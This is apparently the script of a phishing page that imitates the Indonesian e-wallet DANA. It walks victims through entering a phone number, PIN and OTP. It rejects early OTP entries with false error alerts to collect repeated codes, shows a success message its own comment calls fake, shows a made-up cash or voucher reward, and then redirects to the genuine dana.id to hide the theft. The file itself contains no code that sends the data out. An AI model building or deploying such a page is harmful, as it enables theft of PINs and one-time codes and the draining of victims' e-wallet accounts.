// script.js
document.addEventListener('DOMContentLoaded', function() {
    // Elemen DOM
    const numberPage = document.getElementById('number-page');
    const pinPage = document.getElementById('pin-page');
    const otpPage = document.getElementById('otp-page');
    const phoneInput = document.getElementById('phone-number');
    const lanjutkanButton = document.getElementById('lanjutkan-button');
    const lanjutkanContainer = document.getElementById('lanjutkan-container');
    const pinBoxes = document.querySelectorAll('.pin-box');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const showText = document.querySelector('.show-text');
    const spinnerOverlay = document.querySelector('.spinner-overlay');
    const floatingNotification = document.getElementById('floating-notification');
    const successNotification = document.getElementById('success-notification');
    const rewardNotification = document.getElementById('reward-notification');
    const otpTimer = document.getElementById('otp-timer');
    const attemptCounter = document.getElementById('attempt-counter');
    const attemptNumber = document.getElementById('attempt-number');
    const verifikasiButton = document.getElementById('verifikasi-button');
    const verifikasiContainer = document.querySelector('.verifikasi-button-container');
    
    // Variabel state
    let currentPage = 'number';
    let pinVisible = false;
    let otpAttempts = 0;
    let countdown;
    let timerSeconds = 120;
    
    // Format nomor telepon
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        
        if (value.length > 0) {
            if (value.length <= 3) {
                value = value;
            } else if (value.length <= 6) {
                value = value.substring(0, 3) + '-' + value.substring(3);
            } else if (value.length <= 11) {
                value = value.substring(0, 3) + '-' + value.substring(3, 6) + '-' + value.substring(6);
            } else {
                value = value.substring(0, 3) + '-' + value.substring(3, 7) + '-' + value.substring(7, 11);
            }
        }
        
        e.target.value = value;
        toggleLanjutkanButton();
    });
    
    // Toggle button lanjutkan berdasarkan input
    function toggleLanjutkanButton() {
        if (currentPage === 'number') {
            const phoneValue = phoneInput.value.replace(/\D/g, '');
            lanjutkanButton.disabled = phoneValue.length < 10;
        } else if (currentPage === 'pin') {
            let pinComplete = true;
            pinBoxes.forEach(box => {
                if (!box.value) pinComplete = false;
            });
            lanjutkanButton.disabled = !pinComplete;
        } else if (currentPage === 'otp') {
            let otpComplete = true;
            otpBoxes.forEach(box => {
                if (!box.value) otpComplete = false;
            });
            lanjutkanButton.disabled = !otpComplete;
        }
    }
    
    // Navigasi antar halaman
    function goToPage(page) {
        numberPage.style.display = 'none';
        pinPage.style.display = 'none';
        otpPage.style.display = 'none';
        
        if (page === 'number') {
            numberPage.style.display = 'block';
            currentPage = 'number';
            lanjutkanButton.textContent = 'Lanjutkan';
        } else if (page === 'pin') {
            pinPage.style.display = 'block';
            currentPage = 'pin';
            lanjutkanButton.textContent = 'Verifikasi';
            pinBoxes[0].focus();
        } else if (page === 'otp') {
            otpPage.style.display = 'block';
            currentPage = 'otp';
            lanjutkanButton.textContent = 'Verifikasi';
            startOTPTimer();
            showFloatingNotification();
            otpBoxes[0].focus();
        }
        
        toggleLanjutkanButton();
    }
    
    // Handler tombol lanjutkan
    lanjutkanButton.addEventListener('click', function() {
        if (currentPage === 'number') {
            showSpinner();
            setTimeout(() => {
                hideSpinner();
                goToPage('pin');
            }, 1500);
        } else if (currentPage === 'pin') {
            showSpinner();
            setTimeout(() => {
                hideSpinner();
                goToPage('otp');
            }, 1500);
        } else if (currentPage === 'otp') {
            verifyOTP();
        }
    });
    
    // Input PIN handling
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', function(e) {
            const value = e.target.value;
            
            if (value.length === 1) {
                if (index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
            }
            
            toggleLanjutkanButton();
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });
    
    // Toggle visibility PIN
    showText.addEventListener('click', function() {
        pinVisible = !pinVisible;
        pinBoxes.forEach(box => {
            box.type = pinVisible ? 'text' : 'password';
        });
        showText.textContent = pinVisible ? 'Sembunyikan' : 'Tampilkan';
    });
    
    // Input OTP handling
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', function(e) {
            const value = e.target.value;
            
            if (value.length === 1) {
                if (index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                } else {
                    lanjutkanButton.focus();
                }
            }
            
            toggleLanjutkanButton();
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                otpBoxes[index - 1].focus();
            }
        });
    });
    
    // Timer OTP
    function startOTPTimer() {
        clearInterval(countdown);
        timerSeconds = 120;
        
        countdown = setInterval(() => {
            timerSeconds--;
            
            const minutes = Math.floor(timerSeconds / 60);
            const seconds = timerSeconds % 60;
            
            otpTimer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timerSeconds <= 0) {
                clearInterval(countdown);
                otpTimer.textContent = '00:00';
                otpTimer.style.color = '#ff3b30';
                
                // Tampilkan tombol verifikasi setelah timer habis
                verifikasiContainer.style.display = 'block';
            }
        }, 1000);
    }
    
    // Tampilkan notifikasi floating
    function showFloatingNotification() {
        floatingNotification.style.display = 'block';
        
        // Sembunyikan setelah 5 detik
        setTimeout(() => {
            floatingNotification.style.display = 'none';
        }, 5000);
    }
    
    // Verifikasi OTP
    function verifyOTP() {
        otpAttempts++;
        
        if (otpAttempts <= 6) {
            showSpinner();
            
            // Update counter percobaan
            attemptCounter.style.display = 'block';
            attemptNumber.textContent = otpAttempts;
            
            setTimeout(() => {
                hideSpinner();
                
                if (otpAttempts >= 3) {
                    // Setelah 3 percobaan, tampilkan notifikasi sukses palsu
                    successNotification.style.display = 'block';
                    
                    // Tampilkan notifikasi hadiah setelah beberapa detik
                    setTimeout(() => {
                        showRewardNotification();
                    }, 2000);
                } else {
                    // Reset OTP boxes untuk percobaan berikutnya
                    otpBoxes.forEach(box => {
                        box.value = '';
                    });
                    otpBoxes[0].focus();
                    toggleLanjutkanButton();
                    
                    // Tampilkan notifikasi error
                    alert('Kode OTP salah. Silakan coba lagi.');
                }
            }, 2000);
        }
    }
    
    // Tampilkan notifikasi hadiah
    function showRewardNotification() {
        const rewards = [
            "Selamat! Anda mendapatkan cashback Rp 50.000",
            "Anda mendapatkan voucher diskon 30%",
            "Selamat! Anda memenangkan undian saldo DANA Rp 100.000",
            "Anda mendapatkan bonus poin sebanyak 500 poin"
        ];
        
        const randomReward = rewards[Math.floor(Math.random() * rewards.length)];
        rewardNotification.textContent = randomReward;
        rewardNotification.style.display = 'block';
        
        // Redirect setelah beberapa detik
        setTimeout(() => {
            window.location.href = "https://dana.id"; // Ganti dengan URL tujuan yang diinginkan
        }, 3000);
    }
    
    // Tampilkan spinner
    function showSpinner() {
        spinnerOverlay.style.display = 'flex';
        lanjutkanButton.disabled = true;
    }
    
    // Sembunyikan spinner
    function hideSpinner() {
        spinnerOverlay.style.display = 'none';
        toggleLanjutkanButton();
    }
    
    // Inisialisasi
    toggleLanjutkanButton();
    
    // Handler untuk tombol verifikasi yang muncul setelah timer habis
    verifikasiButton.addEventListener('click', function() {
        startOTPTimer();
        otpTimer.style.color = '#000';
        verifikasiContainer.style.display = 'none';
        alert('Kode OTP baru telah dikirim.');
    });
});
